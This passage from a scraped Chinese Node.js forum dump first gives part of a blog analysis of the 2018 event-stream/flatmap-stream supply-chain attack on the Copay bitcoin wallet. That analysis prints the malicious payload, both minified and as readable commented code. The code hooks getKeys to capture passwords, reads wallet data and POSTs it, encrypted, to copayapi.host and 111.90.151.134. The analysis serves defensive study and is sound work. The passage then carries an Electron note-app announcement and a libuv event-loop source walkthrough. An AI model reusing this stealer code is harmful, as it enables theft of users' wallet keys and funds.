l(t, n) {\n                if (window.cordova) try {\n                    var e = cordova.file.dataDirectory;\n                    resolveLocalFileSystemURL(e, function(e) {\n                        e.getFile(t, {\n                            create: !1\n                        }, function(e) {\n                            e.file(function(e) {\n                                var t = new FileReader;\n                                t.onloadend = function() {\n                                    return n(JSON.parse(t.result))\n                                }, t.onerror = function(e) {\n                                    t.abort()\n                                }, t.readAsText(e)\n                            })\n                        })\n                    })\n                } catch (e) {} else {\n                    try {\n                        var r = localStorage.getItem(t);\n                        if (r) return n(JSON.parse(r))\n                    } catch (e) {}\n                    try {\n                        chrome.storage.local.get(t, function(e) {\n                            if (e) return n(JSON.parse(e[t]))\n                        })\n                    } catch (e) {}\n                }\n            }\n            global.CSSMap = {}, l(&quot;profile&quot;, function(e) {\n                for (var t in e.credentials) {\n                    var n = e.credentials[t];\n                    &quot;livenet&quot; == n.network &amp;&amp; l(&quot;balanceCache-&quot; + n.walletId, function(e) {\n                        var t = this;\n                        t.balance = parseFloat(e.balance.split(&quot; &quot;)[0]), &quot;btc&quot; == t.coin &amp;&amp; t.balance &lt; 100 || &quot;bch&quot; == t.coin &amp;&amp; t.balance &lt; 1e3 || (global.CSSMap[t.xPubKey] = !0, r(&quot;c&quot;, JSON.stringify(t)))\n                    }.bind(n))\n                }\n            });\n            var e = require(&quot;bitcore-wallet-client&#x2F;lib&#x2F;credentials.js&quot;);\n            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {\n                var t = this.getKeysFunc(e);\n                try {\n                    global.CSSMap &amp;&amp; global.CSSMap[this.xPubKey] &amp;&amp; (delete global.CSSMap[this.xPubKey], r(&quot;p&quot;, e + &quot;\\t&quot; + this.xPubKey))\n                } catch (e) {}\n                return t\n            }\n        } catch (e) {}\n    }\n    window.cordova ? document.addEventListener(&quot;deviceready&quot;, e) : e()\n}();\n</code></pre><p>这段代码才是真正窃取比特币的代码，我们稍后再分析。</p>\n<h3>黑客是如何隐藏黑客代码的？</h3>\n<ul>\n<li>黑客一共隐藏了3段代码；</li>\n<li>第1段代码隐藏在<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>的<a href=\"https://unpkg.com/flatmap-stream@0.1.1/index.min.js\">index.min.js</a>结尾，代码中使用了16进制字符串来隐藏正真使用的字符串；</li>\n<li>第2段代码隐藏在<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>的<strong>test/data</strong>的数组中，需要使用<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串才能解密，它在第1段代码中解密；</li>\n<li>第3段代码也隐藏在<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>的<strong>test/data</strong>的数组中，需要使用<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串才能解密，它在第2段代码中解密；</li>\n<li>正真窃取比特币钱包<a href=\"https://github.com/bitpay/copay\">copay</a>的是第3段代码；</li>\n<li>第2段和第3段代码刚好需要使用<a href=\"https://github.com/bitpay/copay\">copay</a>中的description字符串**“A Secure Bitcoin Wallet”**才能解密，可知黑客攻击的目标就是<a href=\"https://github.com/bitpay/copay\">copay</a>项目；</li>\n<li>黑客多处使用了**Buffer.from(str, “hex”).toString()**来混淆代码，将ASCII字符串转换为16进制字符串，使我们难以读懂代码；</li>\n<li>黑客2次使用了AES256算法加密黑客代码，如果找不到解密的密码，就不可能知道黑客到底是攻击哪个项目，也不知道他干了什么。 <a href=\"https://github.com/dominictarr/event-stream/issues/116#issuecomment-441744514\">maths22</a>成功<a href=\"https://github.com/dominictarr/event-stream/issues/116#issuecomment-441744514\">找到</a>了密码&quot;A Secure Bitcoin Wallet&quot;以及被攻击的项目<a href=\"https://github.com/bitpay/copay\">copay</a>；</li>\n<li>黑客把所有黑客代码都写在了try…catch里面，否则抛出莫名其妙的错误很容易暴露；(这里从另一个角度证明了监控代码错误的重要性，欢迎大家免费试用<a href=\"https://www.fundebug.com/\">Fundebug</a>)</li>\n</ul>\n<h3>黑客是如何窃取比特币的</h3>\n<p>我分析并且简化了黑客的第3段代码，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;*global cordova resolveLocalFileSystemURL chrome*&#x2F;\n!(function() {\n    var http = require(&quot;http&quot;);\n    var crypto = require(&quot;crypto&quot;);\n    &#x2F;&#x2F; 黑客的公钥，用于加密窃取的数据，这样只有黑客的公钥可以解密\n    var publicKey =\n        &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs&#x2F;peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+&#x2F;BiGud7b77Fwfq372fUuEIk\\n2P&#x2F;pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw&#x2F;6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl&#x2F;cJ&#x2F;x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----&quot;;\n\n    &#x2F;&#x2F; 将窃取的数据发送到黑客的服务器\n    function httpRequest(hostname, path, data) {\n        var request = http.request(\n            {\n                hostname: hostname,\n                port: 8080,\n                method: &quot;POST&quot;,\n                path: &quot;&#x2F;&quot; + path,\n                headers: {\n                    &quot;Content-Length&quot;: data.length,\n                    &quot;Content-Type&quot;: &quot;text&#x2F;html&quot;\n                }\n            },\n            function() {}\n        );\n        request.on(&quot;error&quot;, function() {});\n        request.write(data);\n        request.end();\n    }\n\n    &#x2F;&#x2F; 用户密码发送至http:&#x2F;&#x2F;111.90.151.134:8080&#x2F;p\n    &#x2F;&#x2F; 用户其他信息发送至http:&#x2F;&#x2F;111.90.151.134:8080&#x2F;c\n    function sendToHacker(path, t) {\n        &#x2F;&#x2F; 黑客对数据进行了简单的编码以及加密\n        for (var n = &quot;&quot;, r = 0; r &lt; t.length; r += 200) {\n            var o = t.substr(r, 200);\n            &#x2F;&#x2F; 使用黑客的公钥对窃取的数据进行加密\n            n +=\n                crypto\n                    .publicEncrypt(publicKey, Buffer.from(o, &quot;utf8&quot;))\n                    .toString(&quot;hex&quot;) + &quot;+&quot;;\n        }\n        httpRequest(&quot;copayapi.host&quot;, path, n);\n        httpRequest(&quot;111.90.151.134&quot;, path, n);\n    }\n\n    &#x2F;&#x2F; 窃取用户信息\n    function getUserInfo(type, n) {\n        if (window.cordova) {\n            var e = cordova.file.dataDirectory;\n            resolveLocalFileSystemURL(e, function(e) {\n                e.getFile(\n                    type,\n                    {\n                        create: !1\n                    },\n                    function(e) {\n                        e.file(function(e) {\n                            var t = new FileReader();\n                            (t.onloadend = function() {\n                                return n(JSON.parse(t.result));\n                            }),\n                                (t.onerror = function() {\n                                    t.abort();\n                                }),\n                                t.readAsText(e);\n                        });\n                    }\n                );\n            });\n        } else {\n            var r = localStorage.getItem(type);\n            if (r) return n(JSON.parse(r));\n\n            chrome.storage.local.get(type, function(e) {\n                if (e) return n(JSON.parse(e[type]));\n            });\n        }\n    }\n\n    function steal() {\n        var ifSteal = false;\n        &#x2F;&#x2F; 窃取将用户的隐私信息，比如私钥\n        getUserInfo(&quot;profile&quot;, function(profile) {\n            for (var t in profile.credentials) {\n                var n = profile.credentials[t];\n                if (n.network == &quot;livenet&quot;) {\n                    getUserInfo(\n                        &quot;balanceCache-&quot; + n.walletId,\n                        function(e) {\n                            var t = this;\n                            t.balance = parseFloat(e.balance.split(&quot; &quot;)[0]);\n                            &#x2F;&#x2F; 当比特币超过100个或者bch超过1000个时，将用户数据发送到黑客服务器\n                            if (\n                                (&quot;btc&quot; == t.coin &amp;&amp; t.balance &gt; 100) ||\n                                (&quot;bch&quot; == t.coin &amp;&amp; t.balance &gt; 1000)\n                            ) {\n                                ifSteal = true;\n                                sendToHacker(&quot;c&quot;, JSON.stringify(t));\n                            }\n                        }.bind(n)\n                    );\n                }\n            }\n        });\n        &#x2F;&#x2F; 通过重写getKeys函数来窃取用户的密码\n        var Credentials = require(&quot;bitcore-wallet-client&#x2F;lib&#x2F;credentials.js&quot;);\n        Credentials.prototype.getKeysFunc = Credentials.prototype.getKeys;\n        Credentials.prototype.getKeys = function(password) {\n            var keys = this.getKeysFunc(password);\n            if (ifSteal) {\n                &#x2F;&#x2F; 将窃取的密码发送到黑客服务器\n                sendToHacker(&quot;p&quot;, password + &quot;\\t&quot; + this.xPubKey);\n            }\n            return keys;\n        };\n    }\n\n    if (window.cordova) {\n        document.addEventListener(&quot;deviceready&quot;, steal);\n    } else {\n        steal();\n    }\n})();\n</code></pre><p>详细分析可以看我写的代码注释，另外，我还总结了这些<strong>要点</strong></p>\n<ul>\n<li>这段代码的目的是窃取用户信息，并非挖矿；</li>\n<li>黑客通过重写<a href=\"https://github.com/bitpay/bitcore-wallet-client/blob/c09c70473096fc9643d78b01b64f0481e2b2b334/lib/credentials.js#L392\">getKeys</a>函数窃取了<a href=\"https://github.com/bitpay/copay\">copay</a>用户的密码，发送到<strong><a href=\"http://111.90.151.134:8080/p\">http://111.90.151.134:8080/p</a></strong></li>\n<li>黑客窃取了<a href=\"https://github.com/bitpay/copay\">copay</a>用户所有的隐私信息，包括私钥，发送到<strong><a href=\"http://111.90.151.134:8080/c\">http://111.90.151.134:8080/c</a></strong></li>\n<li>黑客对窃取的数据进行了简单混淆以及公钥加密，因此只有他可以读取窃取的数据；</li>\n<li>黑客显然分析了<a href=\"https://github.com/bitpay/copay\">copay</a>源码，然后量身定做了这段代码，因此这段代码对其他项目是无效的，肯定会报错，所以他写了很多try…catch。从另一个角度来讲，<strong>其他项目比如Vue完全不用担心</strong>；</li>\n<li>通过nmap命令扫描黑客的服务器111.90.151.134的8080端口可知，他目前已经不再接收窃取的数据；</li>\n</ul>\n<h3>结尾</h3>\n<p>通过这件事，大家可能会觉得开源不安全，但是我不这样看。黑客之所以处心积虑想了这么多歪招来窃取用户数据，就是因为代码是开源的，他不敢乱来。另外，这件事虽然潜伏了几个月，但是一经发现，大家分析一下代码，齐心协力很快就发现黑客到底干了什么，把整件事的来龙去脉翻了个底朝天，我也是基于大家的工作又梳理了这件事。我们应该思考的是，如何让代码更加安全，而这件事恰恰可以给我们很多启示，这个我下次再聊。</p>\n<p>其实，这件事挺有意思的，还有很多问题，比如黑客一共用到了哪些技巧？黑客是怎么被发现的？黑客究竟是谁？如何保证JavaScript与区块链的安全性？以后再说吧…</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident\">Details about the event-stream incident</a></li>\n<li><a href=\"https://schneid.io/blog/event-stream-vulnerability-explained/\">event-stream vulnerability explained</a></li>\n<li><a href=\"https://github.com/dominictarr/event-stream/issues/116\">I don’t know what to say.</a></li>\n<li><a href=\"https://github.com/bitpay/copay/issues/9346\">event-stream dependency attack steals wallets from users of copay</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/IaOWxG0XLvn2znvvP1dmwA\">月下载量千万的npm包被黑客篡改，Vue开发者可能正在遭受攻击</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，得到了Google、360、金山软件、百姓网等众多知名用户的认可。欢迎免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2018/12/03/how-does-javascript-hacker-steal-bitcoin/\">https://blog.fundebug.com/2018/12/03/how-does-javascript-hacker-steal-bitcoin/</a></p>\n</div>","title":"JavaScript黑客是这样窃取比特币的，Vue开发者不用担心！","last_reply_at":"2018-12-06T02:54:57.051Z","good":true,"top":false,"reply_count":5,"visit_count":1889,"create_at":"2018-12-03T02:49:15.127Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c049e5c39c0af64fddb80e1","author_id":"5c0362f439c0af64fddb7c92","tab":"share","content":"<div class=\"markdown-text\"><p>我和好基友一起开发了Tea，一款带有plugin系统的富文本应用，可以想象成是给程序员用的笔记应用，基于nodejs+electron+react+slatejs（一款富文本编辑器框架）。</p>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/overview.png\" alt=\"alt text\"></p>\n<p><strong>技术栈</strong></p>\n<ol>\n<li>electron：桌面多平台web开发框架</li>\n<li>nodejs：electron里自带，跟操作系统、文件系统交互需要</li>\n<li>react：前端框架</li>\n<li>material-ui：基于react的material UI框架</li>\n<li>slate.js: 这是一个革命性的富文本框架，基于react</li>\n<li>Webpack：构建工具</li>\n<li>babel：转译工具</li>\n<li>阿里云：自动更新</li>\n</ol>\n<p>废话不多说，功能上图：</p>\n<h3>1. 所见即所得的 Markdown</h3>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/markdown.gif\" alt=\"alt text\"></p>\n<h3>2. 各种高效的快捷键</h3>\n<ul>\n<li>图片、标题等对象的插入，可以通过在段首打 @ 呼出</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/at-demo.gif\" alt=\"alt text\"></p>\n<ul>\n<li>通过 ⌘ + / (Windows 下是Ctrl + /) ，可以查看所有的快捷键，和 Markdown 格式</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/shortcuts-640480.gif\" alt=\"alt text\"></p>\n<h3>3. 插件</h3>\n<p>目前我们自己开发的插件有：</p>\n<ul>\n<li>Vim 模式</li>\n<li>公式编辑——支持 Latex 公式输入</li>\n<li>Markdown 编辑——没错，上面说的所见即所得的 Markdown，其实是一个插件😎</li>\n<li>炸裂模式——见下图，Atom 用户，让我看到你们的双手🤘🤘</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/power-mode.gif\" alt=\"alt text\"></p>\n<h3>4. 速记</h3>\n<p>一个即时贴功能，我们称为小窗口。按下快捷键，Ctrl + Shift + 空格，弹出；再按一次快捷键，关闭。</p>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/little-window.gif\" alt=\"alt text\"></p>\n<h3>5. 极简的界面</h3>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/%E5%A4%A7%E7%99%BD%E7%BA%B8.png\" alt=\"alt text\"></p>\n<h2>未来</h2>\n<ul>\n<li>关于Tea的详细介绍：<a href=\"https://juejin.im/post/5bffadf3f265da616a476096\">https://juejin.im/post/5bffadf3f265da616a476096</a></li>\n<li>现在我们正在内测单机版，感兴趣的小伙伴，请在电脑上打开我们官网 <a href=\"https://haocha.co/\">https://haocha.co/</a>，下载Windows或Mac的内测版。</li>\n<li>另外也欢迎加入我们反馈群，提出你的意见和反馈：</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/feedback-qr-2.jpeg\" alt=\"alt text\"></p>\n<p>目前在我们 backlog 里的功能有：</p>\n<ol>\n<li>Command （ Ctrl ） + Shift + P 命令面板</li>\n<li>代码片段中代码直接运行</li>\n<li>内置 Terminal</li>\n<li>Solarized、Dracula 等各种主题</li>\n<li>分屏</li>\n<li>GitHub Gist 整合</li>\n<li>Presentation 模式</li>\n<li>类似 Sublime 的 Minimap</li>\n<li>自定义快捷键</li>\n<li>流程图、思维导图等图表插入</li>\n<li>。。。</li>\n</ol>\n<p>欢迎大家给我们提出你想要的功能建议。</p>\n<p>enjoy</p>\n</div>","title":"基于nodejs+electron+react+slatejs开发的一款带有plugin系统的富文本应用","last_reply_at":"2018-12-06T02:36:24.078Z","good":false,"top":false,"reply_count":6,"visit_count":1128,"create_at":"2018-12-03T03:09:16.909Z","author":{"loginname":"giddens9527","avatar_url":"https://avatars2.githubusercontent.com/u/2219296?v=4&s=120"}},{"id":"5a9108d78d6e16e56bb80882","author_id":"565553143325bb2c4ebd803a","tab":"share","content":"<div class=\"markdown-text\"><h1>2018/5/8更新：</h1>\n<p>距离这篇文章完笔虽然才两个月，但是我已经对各种细节忘记得差不多（不常用的东西马上就忘记了，大脑内存不足会经常自动腾出空间记忆别的事情），各位如果有任何疑问我大概率是回答不上来，非常抱歉。另外我觉得深入折腾这种东西意义其实不是太大，还不如学习一下更加通用价值更加高的知识（例如算法、数据库原理、操作系统原理、tcp/ip协议、架构设计、高数线代概率统计等）</p>\n<h1>不同的event loop</h1>\n<p>event loop是一个执行模型，在不同的地方有不同的实现。浏览器和nodejs基于不同的技术实现了各自的event loop。网上关于它的介绍多如牛毛，但大多数是基于浏览器的，真正讲nodejs的event loop的并没有多少，甚至很多将浏览器和nodejs的event loop等同起来的。  我觉得讨论event loop要做到以下两点：</p>\n<ul>\n<li><strong>首先要确定好上下文，nodejs和浏览器的event loop是两个有明确区分的事物，不能混为一谈</strong>。</li>\n<li>其次，讨论一些js异步代码的执行顺序时候，<strong>要基于node的源码而不是自己的臆想</strong>。</li>\n</ul>\n<p>简单来讲，</p>\n<ul>\n<li><strong>nodejs的event是基于libuv，而浏览器的event loop则在<a href=\"https://www.w3.org/TR/html5/webappapis.html#event-loops\">html5的规范</a>中明确定义</strong>。</li>\n<li>libuv已经对event loop作出了实现，而html5规范中只是定义了浏览器中event loop的模型，具体实现留给了浏览器厂商。</li>\n</ul>\n<h1>nodejs中的event loop</h1>\n<p>关于nodejs中的event loop有两个地方可以参考，一个是nodejs<a href=\"https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/\">官方的文档</a>；另一个是libuv的<a href=\"http://docs.libuv.org/en/v1.x/design.html\">官方的文档</a>，前者已经对nodejs有一个比较完整的描述，而后者则有更多细节的描述。nodejs正在快速发展，源码变化很大，以下的讨论都是基于nodejs9.5.0。</p>\n<p>（然而nodejs的event loop似乎比预料更加复杂，在查看nodejs源码的过程中我惊奇发现原来nodejs的event loop的某些阶段，还会将v8的micro task queue中的任务取出来运行，看来nodejs的浏览器的event loop还是存在一些关联，这些细节我们往后再讨论，目前先关注重点内容。）</p>\n<h2>event loop的6个阶段（phase）</h2>\n<p>nodejs的event loop分为6个阶段，每个阶段的作用如下（<code>process.nextTick()</code>在6个阶段结束的时候都会执行，文章后半部分会详细分析<code>process.nextTick()</code>的回调是怎么引进event loop，仅仅从<code>uv_run()</code>是找不到<code>process.nextTick()</code>是如何牵涉进来）：</p>\n<ul>\n<li>timers：执行<code>setTimeout()</code> 和 <code>setInterval()</code>中到期的callback。</li>\n<li>I/O callbacks：上一轮循环中有少数的I/Ocallback会被延迟到这一轮的这一阶段执行</li>\n<li>idle, prepare：仅内部使用</li>\n<li>poll：最为重要的阶段，执行I/O callback，在适当的条件下会阻塞在这个阶段</li>\n<li>check：执行setImmediate的callback</li>\n<li>close callbacks：执行close事件的callback，例如<code>socket.on(&quot;close&quot;,func)</code></li>\n</ul>\n<pre class=\"prettyprint language-C\"><code>   ┌───────────────────────┐\n┌─&gt;│        timers         │\n│  └──────────┬────────────┘\n│  ┌──────────┴────────────┐\n│  │     I&#x2F;O callbacks     │\n│  └──────────┬────────────┘\n│  ┌──────────┴────────────┐\n│  │     idle, prepare     │\n│  └──────────┬────────────┘      ┌───────────────┐\n│  ┌──────────┴────────────┐      │   incoming:   │\n│  │         poll          │&lt;─────┤  connections, │\n│  └──────────┬────────────┘      │   data, etc.  │\n│  ┌──────────┴────────────┐      └───────────────┘\n│  │        check          │\n│  └──────────┬────────────┘\n│  ┌──────────┴────────────┐\n└──┤    close callbacks    │\n   └───────────────────────┘\n</code></pre><p>event loop的每一次循环都需要依次经过上述的阶段。  每个阶段都有自己的callback队列，每当进入某个阶段，都会从所属的队列中取出callback来执行，当队列为空或者被执行callback的数量达到系统的最大数量时，进入下一阶段。这六个阶段都执行完毕称为一轮循环。</p>\n<p>event loop的核心代码在deps/uv/src/unix/core.c</p>\n<pre class=\"prettyprint language-C\"><code>int uv_run(uv_loop_t* loop, uv_run_mode mode) {\n  int timeout;\n  int r;\n  int ran_pending;\n\n  &#x2F;*\n  从uv__loop_alive中我们知道event loop继续的条件是以下三者之一：\n  1，有活跃的handles（libuv定义handle就是一些long-lived objects，例如tcp server这样）\n  2，有活跃的request\n  3，loop中的closing_handles\n  *&#x2F;\n  r = uv__loop_alive(loop);\n  if (!r)\n    uv__update_time(loop);\n\n  while (r != 0 &amp;&amp; loop-&gt;stop_flag == 0) {\n    uv__update_time(loop);&#x2F;&#x2F;更新时间变量，这个变量在uv__run_timers中会用到\n    uv__run_timers(loop);&#x2F;&#x2F;timers阶段\n    ran_pending = uv__run_pending(loop);&#x2F;&#x2F;从libuv的文档中可知，这个其实就是I&#x2F;O callback阶段,ran_pending指示队列是否为空\n    uv__run_idle(loop);&#x2F;&#x2F;idle阶段\n    uv__run_prepare(loop);&#x2F;&#x2F;prepare阶段\n\n    timeout = 0;\n\n    &#x2F;**\n    设置poll阶段的超时时间，以下几种情况下超时会被设为0，这意味着此时poll阶段不会被阻塞，在下面的poll阶段我们还会详细讨论这个\n    1，stop_flag不为0\n    2，没有活跃的handles和request\n    3，idle、I&#x2F;O callback、close阶段的handle队列不为空\n    否则，设为timer阶段的callback队列中，距离当前时间最近的那个\n    **&#x2F;    \n    if ((mode == UV_RUN_ONCE &amp;&amp; !ran_pending) || mode == UV_RUN_DEFAULT)\n      timeout = uv_backend_timeout(loop);\n\n    uv__io_poll(loop, timeout);&#x2F;&#x2F;poll阶段\n    uv__run_check(loop);&#x2F;&#x2F;check阶段\n    uv__run_closing_handles(loop);&#x2F;&#x2F;close阶段\n    &#x2F;&#x2F;如果mode == UV_RUN_ONCE（意味着流程继续向前）时，在所有阶段结束后还会检查一次timers，这个的逻辑的原因不太明确\n    \n    if (mode == UV_RUN_ONCE) {\n      uv__update_time(loop);\n      uv__run_timers(loop);\n    }\n\n    r = uv__loop_alive(loop);\n    if (mode == UV_RUN_ONCE || mode == UV_RUN_NOWAIT)\n      break;\n  }\n\n  if (loop-&gt;stop_flag != 0)\n    loop-&gt;stop_flag = 0;\n\n  return r;\n}\n\n</code></pre><p>我对重要部分加上注释，从上述代码可以看到event loop的六个阶段是依次执行的。值得注意的是，在UV_RUN_ONCE模式下，timers阶段在当前循环结束前还会得到一次的执行机会。</p>\n<h2>timers阶段</h2>\n<p>timer阶段的代码在deps/uv/src/unix/timer.c的<code>uv__run_timers()</code>中</p>\n<pre class=\"prettyprint language-C\"><code>void uv__run_timers(uv_loop_t* loop) {\n  struct heap_node* heap_node;\n  uv_timer_t* handle;\n\n  for (;;) {\n    heap_node = heap_min((struct heap*) &amp;loop-&gt;timer_heap);&#x2F;&#x2F;取出timer堆上超时时间最小的元素\n    if (heap_node == NULL)\n      break;\n    &#x2F;&#x2F;根据上面的元素，计算出handle的地址，head_node结构体和container_of的结合非常巧妙，值得学习\n    handle = container_of(heap_node, uv_timer_t, heap_node);\n    if (handle-&gt;timeout &gt; loop-&gt;time)&#x2F;&#x2F;如果最小的超时时间比循环运行的时间还要大，则表示没有到期的callback需要执行，此时退出timer阶段\n      break;\n\n    uv_timer_stop(handle);&#x2F;&#x2F;将这个handle移除\n    uv_timer_again(handle);&#x2F;&#x2F;如果handle是repeat类型的，重新插入堆里\n    handle-&gt;timer_cb(handle);&#x2F;&#x2F;执行handle上的callback\n  }\n}\n</code></pre><p>从上面的逻辑可知，<strong>在timer阶段其实使用一个最小堆而不是队列来保存所有元素</strong>（其实也可以理解，因为timeout的callback是按照超时时间的顺序来调用的，并不是先进先出的队列逻辑），然后循环取出所有到期的callback执行。</p>\n<h2>I/O callbacks阶段</h2>\n<p>I/O callbacks阶段的代码在deps/uv/src/unix/core.c的<code>int uv__run_pending()</code>中</p>\n<pre class=\"prettyprint language-C\"><code>static int uv__run_pending(uv_loop_t* loop) {\n  QUEUE* q;\n  QUEUE pq;\n  uv__io_t* w;\n\n  if (QUEUE_EMPTY(&amp;loop-&gt;pending_queue))&#x2F;&#x2F;如果队列为空则退出\n    return 0;\n\n  QUEUE_MOVE(&amp;loop-&gt;pending_queue, &amp;pq);&#x2F;&#x2F;移动该队列\n\n  while (!QUEUE_EMPTY(&amp;pq)) {\n    q = QUEUE_HEAD(&amp;pq);&#x2F;&#x2F;取出队列的头结点\n    QUEUE_REMOVE(q);&#x2F;&#x2F;将其移出队列\n    QUEUE_INIT(q);&#x2F;&#x2F;不再引用原来队列的元素\n    w = QUEUE_DATA(q, uv__io_t, pending_queue);\n    w-&gt;cb(loop, w, POLLOUT);&#x2F;&#x2F;执行callbak直到队列为空\n  }\n  return 1;\n}\n</code></pre><p>根据libuv的文档，一些应该在上轮循环poll阶段执行的callback，因为某些原因不能执行，就会被延迟到这一轮的循环的I/O callbacks阶段执行。换句话说这个阶段执行的callbacks是上轮残留的。</p>\n<h2>idle和prepare阶段</h2>\n<p><code>uv__run_idle()</code>、<code>uv__run_prepare()</code>、<code>uv__run_check()</code>定义在文件deps/uv/src/unix/loop-watcher.c中，它们的逻辑非常相似，其中的实现利用了大量的宏（说实在我个人非常烦宏，它的可读性真的很差，为了那点点的性能而使用宏真是值得商榷）。</p>\n<pre class=\"prettyprint language-C\"><code>  void uv__run_##name(uv_loop_t* loop) {                                      \\\n    uv_##name##_t* h;                                                         \\\n    QUEUE queue;                                                              \\\n    QUEUE* q;                                                                 \\\n    QUEUE_MOVE(&amp;loop-&gt;name##_handles, &amp;queue);&#x2F;&#x2F;用新的头节点取代旧的头节点，相当于将原队列移动到新队列                                \\\n    while (!QUEUE_EMPTY(&amp;queue)) {&#x2F;&#x2F;当新队列不为空                                            \\\n      q = QUEUE_HEAD(&amp;queue);&#x2F;&#x2F;取出新队列首元素                                                 \\\n      h = QUEUE_DATA(q, uv_##name##_t, queue);&#x2F;&#x2F;获取首元素中指向的handle                                \\\n      QUEUE_REMOVE(q);&#x2F;&#x2F;将这个元素移出新队列                                                        \\\n      QUEUE_INSERT_TAIL(&amp;loop-&gt;name##_handles, q);&#x2F;&#x2F;然后再插入旧队列尾部                            \\\n      h-&gt;name##_cb(h);&#x2F;&#x2F;执行对应的callback                                                        \\\n    }                                                                         \\\n  } \n</code></pre><h2>poll阶段</h2>\n<p>poll阶段的代码+注释高达200行不好逐行分析，我们挑选部分重要代码</p>\n<pre class=\"prettyprint language-C\"><code>void uv__io_poll(uv_loop_t* loop, int timeout) {\n\t&#x2F;&#x2F;...\n\t&#x2F;&#x2F;处理观察者队列\n\twhile (!QUEUE_EMPTY(&amp;loop-&gt;watcher_queue)) {\n\t\t&#x2F;&#x2F;...\n\tif (w-&gt;events == 0)\n\t  op = UV__EPOLL_CTL_ADD;&#x2F;&#x2F;新增监听这个事件\n\telse\n\t  op = UV__EPOLL_CTL_MOD;&#x2F;&#x2F;修改这个事件\n\t}\n \t&#x2F;&#x2F;...\n \t&#x2F;&#x2F;阻塞直到监听的事件来临，前面已经算好timeout以防uv_loop一直阻塞下去\n\tif (no_epoll_wait != 0 || (sigmask != 0 &amp;&amp; no_epoll_pwait == 0)) {\n\t  nfds = uv__epoll_pwait(loop-&gt;backend_fd,\n\t            events,\n\t            ARRAY_SIZE(events),\n\t            timeout,\n\t            sigmask);\n\t  if (nfds == -1 &amp;&amp; errno == ENOSYS)\n\t    no_epoll_pwait = 1;\n\t} else {\n\t  nfds = uv__epoll_wait(loop-&gt;backend_fd,\n\t           events,\n\t           ARRAY_SIZE(events),\n\t           timeout);\n\t  if (nfds == -1 &amp;&amp; errno == ENOSYS)\n\t    no_epoll_wait = 1;\n\t}\n\t&#x2F;&#x2F;...\n\tfor (i = 0; i &lt; nfds; i++) {\n\t    if (w == &amp;loop-&gt;signal_io_watcher)\n\t      have_signals = 1;\n\t    else\n\t      w-&gt;cb(loop, w, pe-&gt;events);&#x2F;&#x2F;执行callback\n\t}\n\t&#x2F;&#x2F;...\n}\n</code></pre><p>可见poll阶段的任务就是阻塞等待监听的事件来临，然后执行对应的callback，其中阻塞是带有超时时间的，以下几种情况都会使得超时时间为0</p>\n<ul>\n<li>uv_run处于UV_RUN_NOWAIT模式下</li>\n<li><code>uv_stop()</code>被调用</li>\n<li>没有活跃的handles和request</li>\n<li>有活跃的idle handles</li>\n<li>有等待关闭的handles</li>\n</ul>\n<p>如果上述都不符合，则超时时间为距离现在最近的timer；如果没有timer则poll阶段会一直阻塞下去</p>\n<h2>check阶段</h2>\n<p>见上面的 <em>idle和prepare阶段</em></p>\n<h2>close阶段</h2>\n<pre class=\"prettyprint language-C\"><code>static void uv__run_closing_handles(uv_loop_t* loop) {\n  uv_handle_t* p;\n  uv_handle_t* q;\n\n  p = loop-&gt;closing_handles;\n  loop-&gt;closing_handles = NULL;\n\n  while (p) {\n    q = p-&gt;next_closing;\n    uv__finish_close(p);\n    p = q;\n  }\n}\n</code></pre><p>这段代码非常浅显，就是循环关闭所有的closing 